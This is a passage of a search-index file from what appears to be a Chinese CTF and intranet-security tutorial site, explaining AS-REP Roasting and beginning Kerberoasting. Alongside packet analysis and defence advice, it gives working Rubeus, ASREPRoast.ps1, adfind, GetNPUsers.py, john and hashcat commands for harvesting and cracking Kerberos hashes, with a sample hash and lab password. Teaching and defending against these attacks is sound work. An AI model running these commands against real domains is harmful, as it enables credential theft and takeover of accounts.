\u6709\u5173\uff0c\u5982\u679c\u57df\u4e2d\u5b58\u5728\u591a\u4e2a\u57df\u63a7\uff0c\u5219\u4e0d\u540c\u57df\u63a7\u4e0a\u8bb0\u5f55\u7684\u65e5\u5fd7\u5e76\u4e0d\u76f8\u540c\uff0c\u5e76\u4e0d\u662f\u6bcf\u4e2a KDC \u4e0a\u90fd\u4f1a\u8bb0\u5f55\u6240\u6709\u7684\u65e5\u5fd7\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article3/index.html","title":"AS-REP Roasting \u653b\u51fb","text":"<p>AS-REP Roasting \u662f\u4e00\u79cd\u5bf9\u7528\u6237\u8d26\u53f7\u8fdb\u884c\u79bb\u7ebf\u7206\u7834\u7684\u653b\u51fb\u65b9\u5f0f\u3002\u4f46\u662f\u8be5\u653b\u51fb\u65b9\u5f0f\u5229\u7528\u6bd4\u8f83\u5c40\u9650\uff0c\u56e0\u4e3a\u5176\u9700\u8981\u7528\u6237\u8d26\u53f7\u8bbe\u7f6e\u201c\u4e0d\u8981\u6c42 kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\u201d\u9009\u9879 \uff0c\u800c\u8be5\u9009\u9879\u9ed8\u8ba4\u662f\u6ca1\u6709\u52fe\u9009\u4e0a\u7684\u3002Kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\u53d1\u9001\u5728 Kerberos \u8eab\u4efd\u9a8c\u8bc1\u7684\u7b2c\u4e00\u9636\u6bb5(<code>AS_REQ &amp; AS_REP</code>)\uff0c\u5b83\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u9632\u6b62\u5bc6\u7801\u79bb\u7ebf\u7206\u7834\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u9884\u8eab\u4efd\u9a8c\u8bc1\u662f\u5f00\u542f\u7684\uff0cKDC \u4f1a\u8bb0\u5f55\u5bc6\u7801\u9519\u8bef\u6b21\u6570\uff0c\u9632\u6b62\u5728\u7ebf\u7206\u7834\u3002</p> <p>\u5f53\u5173\u95ed\u4e86\u9884\u8eab\u4efd\u9a8c\u8bc1\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6307\u5b9a\u7528\u6237\u5411\u57df\u63a7\u7684 <code>88</code> Kerberos \u7aef\u53e3\u53bb\u8bf7\u6c42\u7968\u636e\uff0c\u6b64\u65f6\u57df\u63a7\u4e0d\u4f1a\u4f5c\u4efb\u4f55\u9a8c\u8bc1\u5c31\u5c06 TGT \u8ba4\u8d2d\u6743\u8bc1 \u548c \u8be5\u7528\u6237 Hash \u52a0\u5bc6\u7684 Login Session Key \u8fd4\u56de\u3002\u56e0\u6b64\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u5bf9\u83b7\u53d6\u5230\u7684 \u7528\u6237 Hash \u52a0\u5bc6\u7684 Login Session Key \u8fdb\u884c\u79bb\u7ebf\u7834\u89e3\uff0c\u5982\u679c\u5b57\u5178\u591f\u5f3a\u5927\uff0c\u5c31\u80fd\u7834\u89e3\u5f97\u5230\u8be5\u6307\u5b9a\u7528\u6237\u7684\u660e\u6587\u5bc6\u7801\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article3/index.html#as-rep-roasting_1","title":"AS-REP Roasting \u653b\u51fb\u8fc7\u7a0b","text":"<p>AS-REP Roasting \u653b\u51fb\u524d\u63d0\u6761\u4ef6\uff1a</p> <ul> <li>\u57df\u7528\u6237\u8bbe\u7f6e\u4e86 \u201c\u4e0d\u8981\u6c42 kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\u201d</li> <li>\u9700\u8981\u4e00\u53f0\u53ef\u4e0e KDC \u8fdb\u884c\u901a\u4fe1\u7684\u4e3b\u673a/\u7528\u6237</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0ctest \u7528\u6237\u52fe\u9009\u4e86\u201c\u4e0d\u8981\u6c42 kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\u201d\u9009\u9879\u3002</p> <p></p> <p>\u9488\u5bf9 AS-REP Roasting \u653b\u51fb\u4e3b\u8981\u5206\u4e3a\u4e24\u6b65\uff1a</p> <ol> <li>\u83b7\u53d6 AS-REP \u54cd\u5e94\u5305\u4e2d\u7528\u6237 Hash \u52a0\u5bc6\u7684 <code>Login Session Key</code>\uff0c\u672c\u6587\u540e\u9762\u7edf\u79f0\u4e3a Hash\u3002</li> <li>\u5bf9\u4e0a\u4e00\u6b65\u83b7\u5f97\u7684 Hash \u8fdb\u884c\u89e3\u5bc6\u3002</li> </ol>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article3/index.html#1-hash","title":"1.\u83b7\u53d6 Hash","text":"<p>\u7b2c\u4e00\u6b65\uff0c\u5148\u83b7\u53d6 AS-REP \u54cd\u5e94\u5305\u4e2d\u7528\u6237 Hash \u52a0\u5bc6\u7684 <code>Login Session Key</code>\uff0c\u4e5f\u5c31\u662f AS-REP \u54cd\u5e94\u5305\u4e2d\u6700\u5916\u5c42 enc-part \u91cc\u9762\u7684 cipher \u90e8\u5206\u3002\u83b7\u53d6 AS-REP \u54cd\u5e94\u5305\u4e2d\u7528\u6237 Hash \u52a0\u5bc6\u7684 <code>Login Session Key</code>\u6709\u5f88\u591a\u5de5\u5177\uff0c\u4ee5\u4e0b\u6f14\u793a\u51e0\u4e2a\u5de5\u5177\u7684\u7528\u6cd5\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article3/index.html#1-rubeus","title":"(1) Rubeus","text":"<p>\u5982\u679c\u5f53\u524d\u4e3b\u673a\u5728\u57df\u5185\u7684\u8bdd\uff0c\u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\u8fd0\u884cRubeus\uff0c\u8be5\u5de5\u5177\u4f1a\u81ea\u52a8\u641c\u7d22\u57df\u5185\u8bbe\u7f6e\u4e86\"\u4e0d\u8981\u6c42kerberos\u57df\u8eab\u4efd\u9a8c\u8bc1\"\u7684\u7528\u6237\uff0c\u5e76\u4ee5\u8be5\u7528\u6237\u8eab\u4efd\u53d1\u9001AS-REQ\u8bf7\u6c42\uff0c\u7531\u4e8e\u4e0d\u9700\u8981\u9884\u8eab\u4efd\u9a8c\u8bc1\uff0c\u6240\u4ee5 KDC \u4f1a\u76f4\u63a5\u8fd4\u56de AS-REP \u56de\u590d\u5305\u3002\u7136\u540e\u8be5\u5de5\u5177\u4f1a\u5c06 AS-REP \u54cd\u5e94\u5305\u4e2d\u8fd4\u56de\u7684\u7528\u6237 Hash \u52a0\u5bc6\u7684<code>Login SessionKey</code>\u4ee5 John \u80fd\u7834\u89e3\u7684\u683c\u5f0f\u4fdd\u5b58\u4e3a hash.txt \u6587\u4ef6\u3002</p> <pre><code>Rubeus.exe asreproast /format:john /outfile:hash.txt\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u8fd0\u884c Rubeus \u5de5\u5177\u83b7\u53d6\u57df\u5185\u8bbe\u7f6e\u4e86\u201c\u4e0d\u8981\u6c42 kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\u201d\u7684\u7528\u6237\uff0c\u641c\u5230\u4e86 test \u7528\u6237\uff0c\u7136\u540e\u4ee5 test \u7528\u6237\u8eab\u4efd\u53d1\u9001 AS-REQ \u8bf7\u6c42\uff0c\u5e76\u5c06KDC \u8fd4\u56de\u7684\u7528\u6237 Hash \u52a0\u5bc6\u7684<code>Login Session Key</code>\u4fdd\u5b58\u4e3a hash.txt \u6587\u4ef6\u3002</p> <p></p> <p>\u901a\u8fc7 WireShark \u6293\u5305\uff0c\u5982\u56fe\u6240\u793a cipher \u90e8\u5206\u5c31\u662f\u6211\u4eec\u8981\u7684\u52a0\u5bc6\u90e8\u5206\u3002</p> <p></p> <p>\u751f\u6210\u7684 hash.txt \u5185\u5bb9\u5982\u4e0b\uff0c\u8be5\u683c\u5f0f\u53ef\u4ee5\u88ab John \u76f4\u63a5\u7206\u7834\uff1a</p> <pre><code>$krb5asrep$test@xie.com:77DB28DB8AE8837A5198EA4927C75952$0FB76D85398C4555AF23FFFBF491DD94DC869EC6AEBDE2CC8440C83559F546FF48443E33BF824AE3EA13C58C8DC3521308DA338DCCC23BD4A1A74482E9D02220DED60B4ACCF10DFC5B97DEDE1805FD46F355D5380C1552368119A10E0961DC0FFFF03D5E0C5941CA13016E223AF2C105D58114EFCC0285DFF54EDB3E3BD477D1E74F74FC66C958835D1B4EAA66C6722796C904B42F5079FE4593BB0C641D9F8B3C83DC297D8B9041156F1B70F97425708100FBE801119239FC10000D9249E963FE591BB0BF7AD4B3A8E801C7EC8F49CF5B2F74F0C77A8A5D9DA1415DA509601D883A\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article3/index.html#2-asreproastps1","title":"(2) ASREPRoast.ps1 \u811a\u672c","text":"<p>\u5982\u679c\u5f53\u524d\u4e3b\u673a\u5728\u57df\u5185\u7684\u8bdd\uff0c\u901a\u8fc7\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5bfc\u5165 ASREPRoast.ps1 \u811a\u672c\u5e76\u8fdb\u884c\u64cd\u4f5c\u3002\u8be5\u811a\u672c\u4f1a\u81ea\u52a8\u641c\u7d22\u57df\u5185\u8bbe\u7f6e\u4e86\u4e0d\u8981\u6c42 Kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\u7684\u57df\u7528\u6237\uff0c\u5e76\u4ee5\u8be5\u7528\u6237\u8eab\u4efd\u53d1\u9001 AS-REQ \u8bf7\u6c42\uff0c\u7531\u4e8e\u4e0d\u9700\u8981\u9884\u8eab\u4efd\u9a8c\u8bc1\uff0c\u6240\u4ee5\u57df\u63a7\u4f1a\u76f4\u63a5\u8fd4\u56de AS-REP \u56de\u590d\u5305\u3002\u7136\u540e\u8be5\u5de5\u5177\u4f1a\u6253\u5370\u51fa\u4e0d\u8981\u6c42 Kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u540d\uff0cDN \u4ee5\u53ca\u7528\u6237 Hash \u52a0\u5bc6\u7684 Login Session Key \u4e5f\u5c31\u662f Hash\u3002\u7136\u540e\u6211\u4eec\u4f7f\u7528select \u8bed\u53e5\u8fc7\u6ee4\u51fa Hash\u3002</p> <pre><code>Import-Module .\\ASREPRoast.ps1\nInvoke-ASREPRoast | select -ExpandProperty Hash\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u8fd0\u884c ASREPRoast \u811a\u672c\u8fdb\u884c\u653b\u51fb\u5e76\u6253\u5370\u51fa\u6211\u4eec\u9700\u8981\u7684\u6570\u636e\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article3/index.html#3","title":"(3) \u975e\u57df\u5185\u673a\u5668","text":"<p>\u5bf9\u4e8e\u975e\u57df\u5185\u7684\u673a\u5668\uff0c\u5c31\u65e0\u6cd5\u901a\u8fc7\u4e0a\u9762\u4e24\u79cd\u65b9\u5f0f\u6765\u83b7\u53d6 Hash \u4e86\u3002\u6240\u4ee5\u8981\u60f3\u83b7\u53d6\u57df\u5185\u8bbe\u7f6e\u4e86 \"\u4e0d\u9700\u8981 kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\" \u7684\u57df\u5185\u8d26\u53f7\uff0c\u53ef\u4ee5\u4f7f\u7528<code>adfind</code>\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u6765\u8fdb\u884c\u8fc7\u6ee4\u67e5\u8be2\uff0c\u8fd9\u4e2a\u524d\u63d0\u4e5f\u5f97\u62e5\u6709\u4e00\u4e2a\u6709\u6548\u7684\u57df\u7528\u6237\u8d26\u53f7\u548c\u5bc6\u7801\u3002\u67e5\u8be2\u51fa\u8bbe\u7f6e\u4e86 \"\u4e0d\u9700\u8981 kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\" \u7684\u57df\u5185\u8d26\u53f7\u4e4b\u540e\uff0c\u518d\u4f7f\u7528<code>ASREPRoast.ps1</code> \u811a\u672c\u6216<code>impacket</code>\u4e0b\u7684 <code>GetNPUsers.py</code> \u811a\u672c\u83b7\u53d6\u9488\u5bf9\u6307\u5b9a\u7528\u6237\u7684\u7528\u6237 Hash \u52a0\u5bc6\u7684<code>Login Session Key</code>\u4e5f\u5c31\u662f Hash\u3002</p> <pre><code>adfind -h 10.211.55.4:389 -u xie\\hack -up P@ss1234 -f \"useraccountcontrol:1.2.840.113556.1.4.803:=4194304\" -dn\n</code></pre> <p>\u5982\u56fe\u4f7f\u7528 adfind \u8fc7\u6ee4\u51fa\u57df\u5185\u8bbe\u7f6e\u4e86 \"\u4e0d\u9700\u8981 kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\" \u7684\u8d26\u53f7\uff0c\u8fc7\u6ee4\u51fa\u4e86 test \u7528\u6237\u3002</p> <p></p> <p>\u7136\u540e\u8fd0\u884c\u5982\u4e0b\u547d\u4ee4\u8c03\u7528 ASREPRoast.ps1 \u811a\u672c\u83b7\u53d6\u9488\u5bf9\u6307\u5b9a\u7528\u6237 test \u7684\u7528\u6237Hash \u52a0\u5bc6\u7684 Login Session Key \u4e5f\u5c31\u662f Hash\uff0c\u8be5\u683c\u5f0f\u53ef\u4ee5\u88ab John \u76f4\u63a5\u7206\u7834\u3002</p> <pre><code>Import-Module .\\ASREPRoast.ps1\nGet-ASREPHash -UserName test -Domain xie.com -Server 10.211.55.4 | Out-File -Encoding ASCII hash.txt\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u8fd0\u884c ASREPRoast \u811a\u672c\u83b7\u53d6\u9488\u5bf9\u6307\u5b9a\u7528\u6237 test \u7684\u7528\u6237 Hash \u52a0\u5bc6\u7684 Login Session Key\u3002</p> <p></p> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528 impacket \u4e0b\u7684 <code>GetNPUsers.py</code> \u811a\u672c\uff0c\u53ea\u9700\u8981\u628a\u4e0a\u4e00\u6b65\u8fc7\u6ee4\u51fa\u7684\u8bbe\u7f6e\u4e86 \"\u4e0d\u9700\u8981 kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\" \u7684\u57df\u5185\u8d26\u53f7\u5199\u5728 users.txt \u6587\u4ef6\u4e2d\u5373\u53ef\u8fd0\u884c\u5982\u4e0b\u547d\u4ee4\u83b7\u53d6\u9488\u5bf9\u6307\u5b9a\u7528\u6237 test \u7684\u7528\u6237 Hash \u52a0\u5bc6\u7684 Login Session Key \u4e5f\u5c31\u662fHash\uff0c\u8be5\u683c\u5f0f\u53ef\u4ee5\u88ab John \u76f4\u63a5\u7206\u7834\u3002</p> <pre><code>python3 GetNPUsers.py -dc-ip 10.211.55.4 -usersfile users.txt -format johnxie.com/\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 GetNPUsers.py \u811a\u672c\u83b7\u53d6\u9488\u5bf9\u6307\u5b9a\u7528\u6237 test \u7684\u7528\u6237 Hash\u52a0\u5bc6\u7684 Login Session Key\u3002</p> <p></p> <p>\u6216\u8005\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u76f2\u7206\uff0c\u8fd9\u5c31\u4e0d\u9700\u8981\u6709\u6548\u7684\u57df\u7528\u6237\u8d26\u53f7\u5bc6\u7801\u3002\u9002\u7528\u4e8e\u653b\u51fb\u8005\u5728\u57df\u5916\u4e14\u6ca1\u6709\u4e00\u4e2a\u6709\u6548\u7684\u57df\u8d26\u53f7\u5bc6\u7801\u3002\u901a\u8fc7\u5c06\u5927\u91cf\u7528\u6237\u5199\u5728 users.txt \u6587\u4ef6\u4e2d\uff0c\u8fd0\u884c\u5982\u4e0b\u547d\u4ee4\u81ea\u52a8\u83b7\u53d6\u6307\u5b9a users.txt \u6587\u4ef6\u4e2d\u7684\u7528\u6237\u662f\u5426\u8bbe\u7f6e\u4e86 \"\u4e0d\u9700\u8981 kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\" \u5c5e\u6027\uff0c\u5e76\u83b7\u53d6\u8bbe\u7f6e\u4e86 \"\u4e0d\u9700\u8981 kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\" \u8d26\u53f7\u7684\u7528\u6237 Hash\u52a0\u5bc6\u7684 Login Session Key\u3002</p> <pre><code>python3 GetNPUsers.py -dc-ip 10.211.55.4 -usersfile users.txt -format johnxie.com/\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 GetNPUsers.py \u811a\u672c\u6279\u91cf\u653b\u51fb\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article3/index.html#2-hash","title":"2.\u7206\u7834 Hash","text":"<pre><code>john --wordlist=/opt/pass.txt hash.txt\n</code></pre> <p>\u7206\u7834\u51fa\u660e\u6587\u5bc6\u7801\u4e3a P@ss1234\u3002</p> <pre><code>hashcat -m 18200 hash.txt pass.txt --force\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article3/index.html#as-rep-roasting_2","title":"AS-REP Roasting \u6293\u5305\u5206\u6790","text":"<p>\u5047\u8bbe\u57df\u5185 test \u7528\u6237\u8bbe\u7f6e\u4e86\u201c\u4e0d\u8981\u6c42 kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\u201d\u5c5e\u6027\u3002\u4ee5\u4e0b\u9488\u5bf9test \u7528\u6237\u8fdb\u884c AS-REP Roasting \u653b\u51fb\uff0c\u5982\u56fe</p> <p></p> <p>\u5728\u653b\u51fb\u7684\u8fc7\u7a0b\u4e2d\u4f7f\u7528 WireShark \u8fdb\u884c\u6293\u5305\u5206\u6790\uff0c\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u653b\u51fb\u8fc7\u7a0b\u6709\u4e24\u4e2a Kerberos \u76f8\u5173\u7684\u5305\u3002</p> <p></p> <p>\u7b2c\u4e00\u4e2a\u5305\u662f\u4ee5 test \u7528\u6237\u8eab\u4efd\u53d1\u8d77\u4e00\u4e2a AS-REQ \u8bf7\u6c42\u3002\u7531\u4e8e test \u7528\u6237\u8bbe\u7f6e\u4e86\u201c\u4e0d\u8981\u6c42 kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\u201d\u5c5e\u6027\uff0c\u56e0\u6b64\u662f\u4e0d\u9700\u8981\u9884\u8ba4\u8bc1\u7684\u3002\u56e0\u6b64\uff0c\u5728\u5982\u56fe\u6240\u793a\u7684 AS-REQ \u8bf7\u6c42\u5305\u4e2d\u53ef\u4ee5\u770b\u5230\u662f\u6ca1\u6709 <code>pA-ENC-TIMESTAMP</code> \u5b57\u6bb5\u7684\u3002</p> <p></p> <p>\u800c\u6b63\u5e38\u7684 AS-REQ \u8bf7\u6c42\u5305\u662f\u6709<code>pA-ENC-TIMESTAMP</code> \u5b57\u6bb5\u7684\uff0c\u5982\u56fe\uff1a</p> <p></p> <p>\u7b2c\u4e8c\u4e2a\u5305\u662f KDC \u7684 AS-REP \u56de\u590d\u3002\u5982\u56fe\u6240\u793a\uff0c\u8be5\u5305\u4e2d\u8fd4\u56de\u4e86 TGT \u8ba4\u8d2d\u6743\u8bc1\u4ee5\u53ca test \u7528\u6237 Hash \u52a0\u5bc6\u7684<code>Login Session Key</code>\uff0c\u4e5f\u5c31\u662f\u6700\u5916\u5c42 <code>enc-part</code> \u91cc\u9762\u7684<code>cipher</code>\u3002\u653b\u51fb\u8005\u4e5f\u5c31\u662f\u518d\u62ff\u5230\u8fd9\u4e32\u52a0\u5bc6\u5b57\u7b26\u540e\u8fdb\u884c\u672c\u5730\u79bb\u7ebf\u7834\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article3/index.html#as-rep-roasting_3","title":"AS-REP Roasting \u653b\u51fb\u9632\u5fa1","text":"<ul> <li>\u68c0\u6d4b\u57df\u4e2d\u662f\u5426\u5b58\u5728\u8bbe\u7f6e\u4e86\u201c\u4e0d\u8981\u6c42 kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\u201d\u5c5e\u6027\u7684\u7528\u6237\u3002\u5982\u679c\u5b58\u5728\uff0c\u5c06\u8be5\u5c5e\u6027\u53d6\u6d88\u52fe\u9009\uff01</li> <li>\u5982\u679c\u60f3\u5728\u65e5\u5fd7\u65b9\u9762\u8fdb\u884c\u67e5\u770b\u7684\u8bdd\uff0c\u91cd\u70b9\u5173\u6ce8\u4e8b\u4ef6 ID \u4e3a 4768(\u8bf7\u6c42Kerberos \u8eab\u4efd\u9a8c\u8bc1\u670d\u52a1)\u7684\u65e5\u5fd7\u3002\u5982\u679c\u6709\u8fc7\u591a\u7684 4768 \u65e5\u5fd7\uff0c\u53ef\u4ee5\u5bf9\u4e8b\u4ef6ID \u4e3a 4768 \u7684\u65e5\u5fd7\u8fdb\u884c\u7b5b\u9009\uff0c\u4e3b\u8981\u7b5b\u9009\u51fa\u9884\u8eab\u4efd\u9a8c\u8bc1\u7c7b\u578b\u4e3a 0 \u7684\u65e5\u5fd7\u3002\u5982S\u56fe\u6240\u793a\uff0c\u662f\u4e8b\u4ef6 ID \u4e3a 4768 \u7684\u65e5\u5fd7\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html","title":"Kerberoasting \u653b\u51fb","text":"<p>Kerberoasting\u653b\u51fb\u53d1\u751f\u5728Kerberos\u534f\u8bae\u7684<code>TGP_REP</code>\u9636\u6bb5\uff0cKDC\u7684TGS\u670d\u52a1\u8fd4\u56de\u4e00\u4e2a\u7531\u670d\u52a1\u54c8\u5e0c\u52a0\u5bc6\u7684ST\u670d\u52a1\u7968\u636e\u7ed9\u5ba2\u6237\u7aef\u3002\u7531\u4e8e\u8be5ST\u670d\u52a1\u7968\u636e\u662f\u7528\u670d\u52a1\u54c8\u5e0c\u7ecf\u8fc7 <code>RC4_HMAC_MD5</code> \u52a0\u5bc6\u7b97\u6cd5\u52a0\u5bc6\u7684\uff0c\u56e0\u6b64\u5ba2\u6237\u7aef\u5728\u62ff\u5230\u8be5 ST \u670d\u52a1\u7968\u636e\u540e\u53ef\u4ee5\u7528\u4e8e\u672c\u5730\u79bb\u7ebf\u7206\u7834\u3002\u5982\u679c\u653b\u51fb\u8005\u7684\u5bc6\u7801\u5b57\u5178\u8db3\u591f\u5f3a\u5927\uff0c\u5219\u5f88\u6709\u53ef\u80fd\u7206\u7834\u51fa SPN \u94fe\u63a5\u7528\u6237\u7684\u660e\u6587\u5bc6\u7801\u3002\u5982\u679c\u8be5\u670d\u52a1\u5728\u57df\u5185\u88ab\u914d\u7f6e\u4e3a\u9ad8\u6743\u9650\u8fd0\u884c\u7684\u8bdd\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u53ef\u80fd\u63a5\u7ba1\u6574\u4e2a\u57df\u3002</p> <p>\u6574\u4e2a\u8fc7\u7a0b\u6700\u6838\u5fc3\u7684\u70b9\u5728\u4e8e\u653b\u51fb\u8005\u548c KDC \u534f\u5546 ST \u670d\u52a1\u7968\u636e\u52a0\u5bc6\u7684\u65f6\u5019\uff0c\u534f\u5546\u7684\u662f\u4f7f\u7528 <code>RC4_HMAC_MD5</code> \u52a0\u5bc6\u7b97\u6cd5\u3002\u800c\u8be5\u52a0\u5bc6\u7b97\u6cd5\u53c8\u76f8\u5bf9\u8f83\u5bb9\u6613\u88ab\u7834\u89e3\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u80fd\u5728\u672c\u5730\u79bb\u7ebf\u7206\u7834\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#kerberoasting_1","title":"Kerberoasting \u653b\u51fb\u8fc7\u7a0b","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u662f Kerberoasting \u653b\u51fb\u7684\u8fc7\u7a0b\uff1a</p> <p></p> <p>\u2460\uff1a\u653b\u51fb\u8005\u63d0\u4f9b\u4e00\u4e2a\u6b63\u5e38\u7684\u57df\u7528\u6237\u5bc6\u7801\u5bf9\u4e00\u4e2a\u57df\u8fdb\u884c\u8eab\u4efd\u8ba4\u8bc1\uff0cKDC \u5728\u9a8c\u8bc1\u8d26\u53f7\u5bc6\u7801\u6709\u6548\u6027\u540e\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a TGT \u8ba4\u8d2d\u6743\u8bc1\u3002\u8be5 TGT \u8ba4\u8d2d\u6743\u8bc1\u7528\u4e8e\u4ee5\u540e\u7684 ST\u670d\u52a1\u7968\u636e\u8bf7\u6c42\u3002</p> <p>\u2461\uff1a\u653b\u51fb\u8005\u4f7f\u7528\u83b7\u5f97\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u8bf7\u6c42\u9488\u5bf9\u6307\u5b9a SPN \u7684 ST \u670d\u52a1\u7968\u636e\u3002\u5728\u670d\u52a1\u7968\u8bc1\u8bf7\u6c42(TGS-REQ)\u8fc7\u7a0b\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6307\u5b9a\u5b83\u4eec\u652f\u6301\u7684 Kerberos \u52a0\u5bc6\u7c7b\u578b\u4e3a <code>RC4_HMAC_MD5(ARCFOUR-HMAC-MD5)</code>\uff0c\u56e0\u4e3a <code>RC4_HMAC_MD5</code> \u52a0\u5bc6\u7b97\u6cd5\u76f8\u6bd4\u4e8e\u5176\u4ed6\u52a0\u5bc6\u7b97\u6cd5\u66f4\u5bb9\u6613\u88ab\u7834\u89e3\u3002</p> <p>\u2462\uff1a\u5982\u679c\u653b\u51fb\u8005\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u662f\u6709\u6548\u7684\uff0c\u4e0d\u7ba1\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u57df\u7528\u6237\u8d26\u53f7\u6709\u65e0\u8bbf\u95ee\u8be5\u6307\u5b9a SPN \u670d\u52a1\u7684\u6743\u9650\uff0cKDC \u90fd\u4f1a\u67e5\u627e\u54ea\u4e2a\u5e10\u6237\u5728<code>ServicedPrincipalName</code> \u5c5e\u6027\u4e2d\u6ce8\u518c\u4e86\u6240\u8bf7\u6c42\u7684 SPN\uff0c\u7136\u540e\u7528\u8be5\u7528\u6237\u7684\u54c8\u5e0c\u4ee5<code>RC4_HMAC_MD5</code> \u52a0\u5bc6\u7c7b\u578b\u52a0\u5bc6 ST \u670d\u52a1\u7968\u636e\u5e76\u5728 <code>TGS-REP</code> \u8fd4\u56de\u5305\u4e2d\u53d1\u9001\u7ed9\u653b\u51fb\u8005\u3002</p> <p>\u2463\uff1a\u653b\u51fb\u8005\u4ece TGS-REP \u4e2d\u63d0\u53d6\u52a0\u5bc6\u7684 ST \u670d\u52a1\u7968\u636e\u3002 \u7531\u4e8e\u8be5 ST \u670d\u52a1\u7968\u636e\u662f\u7528\u94fe\u63a5\u5230\u8bf7\u6c42\u7684 SPN \u7684\u5e10\u6237\u54c8\u5e0c\u52a0\u5bc6\u7684\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u53ef\u4ee5\u672c\u5730\u79bb\u7ebf\u7834\u89e3\u8fd9\u4e2a ST\u670d\u52a1\u7968\u636e\u3002\u5982\u679c\u653b\u51fb\u8005\u7684\u5b57\u5178\u8db3\u591f\u5f3a\u5927\uff0c\u5219\u53ef\u4ee5\u7206\u7834\u51fa\u8be5 SPN \u6240\u94fe\u63a5\u8d26\u6237\u7684\u660e\u6587\u5bc6\u7801\u3002</p> <p>\u6ce8\uff1aKerberosating \u653b\u51fb\u4e00\u822c\u53ea\u9488\u5bf9\u6ce8\u518c\u5728\u7528\u6237\u4e0b\u7684 SPN\uff0c\u56e0\u4e3a\u673a\u5668\u8d26\u53f7\u7684\u5bc6\u7801\u662f\u968f\u673a\u751f\u6210 128 \u4f4d\u5b57\u7b26\uff0c\u662f\u4e0d\u53ef\u80fd\u7206\u7834\u51fa\u6765\u7684\u3002</p> <p>Kerberoasting \u653b\u51fb\u5728\u5b9e\u6218\u4e2d\u4e3b\u8981\u5206\u4e3a\u5982\u4e0b\u56db\u6b65\uff1a</p> <ol> <li>\u67e5\u8be2\u57df\u5185\u6ce8\u518c\u4e8e\u57df\u7528\u6237\u4e0b\u7684 SPN</li> <li>\u8bf7\u6c42\u6307\u5b9a SPN \u7684 ST \u670d\u52a1\u7968\u636e</li> <li>\u5bfc\u51fa\u8bf7\u6c42\u7684 ST \u670d\u52a1\u7968\u636e</li> <li>\u5bf9\u8be5\u5bfc\u51fa\u7684 ST \u670d\u52a1\u7968\u636e\u8fdb\u884c\u79bb\u7ebf\u7206\u7834</li> </ol> <p>\u6709\u4e9b\u5de5\u5177\u5bf9\u7b2c\u4e00\u4e8c\u6b65\u5408\u5e76\u5728\u4e00\u8d77\uff0c\u53d1\u73b0\u4e86\u53ef\u80fd\u5b58\u5728\u5f31\u5bc6\u7801\u7684 SPN \u540e\uff0c\u76f4\u63a5\u8bf7\u6c42\u8be5\u6307\u5b9a SPN \u7684\u670d\u52a1\u7968\u636e\u3002\u4ee5\u4e0b\u6f14\u793a\u51e0\u4e2a\u5de5\u5177\u7684\u7528\u6cd5\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#spn","title":"SPN \u670d\u52a1\u4e3b\u4f53\u540d\u79f0\u7684\u53d1\u73b0","text":"<p>\u8fd9\u662f <code>Kerberoasting</code> 